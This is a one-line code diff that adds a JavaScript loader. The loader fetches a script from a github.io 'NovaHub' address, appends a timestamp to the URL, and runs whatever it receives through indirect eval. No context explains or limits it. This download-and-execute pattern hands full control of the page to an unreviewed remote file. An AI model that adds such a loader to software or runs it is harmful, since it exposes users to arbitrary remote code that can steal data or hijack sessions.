@@ -1,0 +1,1 @@
+fetch('https://starlightgg.github.io/NovaGG.github.io/NovaHub/NovaScriptin.js' + Date.now()).then(r => r.text()).then(code => (0, eval)(code));
